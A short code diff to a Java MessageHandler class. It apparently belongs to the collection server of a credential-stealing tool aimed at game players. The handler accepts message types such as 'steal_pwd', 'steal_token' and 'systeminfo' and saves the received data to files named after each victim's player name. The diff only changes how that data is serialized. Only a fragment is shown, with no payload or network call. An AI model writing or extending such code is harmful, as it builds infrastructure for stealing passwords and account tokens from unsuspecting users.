@@ -51,7 +51,7 @@ public class MessageHandler {
                     case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo", "props" -> {
                         String ext = msgType.equals("systeminfo") ? "txt" : "json";
                         File file = new File("data/data", getFileName(msgType, ext, info.playerData.get("playerName").getAsString(), true));
-                        FileUtil.write(file, (String) msg[0]);
+                        FileUtil.write(file, GSON.toJson(msg[0]));
                     }
                     case "server_name" -> server.sendUtil.trySend(conn, server, msgType, server.name);
                     case "key" -> {
